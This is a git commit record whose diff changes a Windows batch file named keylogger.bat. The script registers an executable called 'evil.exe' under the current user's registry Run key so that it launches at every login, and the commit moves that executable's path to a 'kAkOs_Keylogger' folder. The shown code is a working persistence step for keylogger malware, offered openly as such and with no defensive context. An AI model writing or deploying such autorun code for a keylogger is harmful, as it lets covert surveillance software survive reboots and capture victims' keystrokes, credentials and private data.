910844674b375cb39d2d26607b012167c073c9ae
kakos1301 <144972038+kakos1301@users.noreply.github.com>
2023-09-14 16:39:35 +1000

    Update keylogger.bat

--- keylogger.bat
+++ keylogger.bat
@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set ProgramPath=C:\Users\Public\Downloads\evil.exe
+set ProgramPath=C:\kAkOs_Keylogger\evil.exe
 REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyProgramName /t REG_SZ /d "%ProgramPath%" /f
 if %errorlevel% == 0 (
     echo Successfully added to autorun.
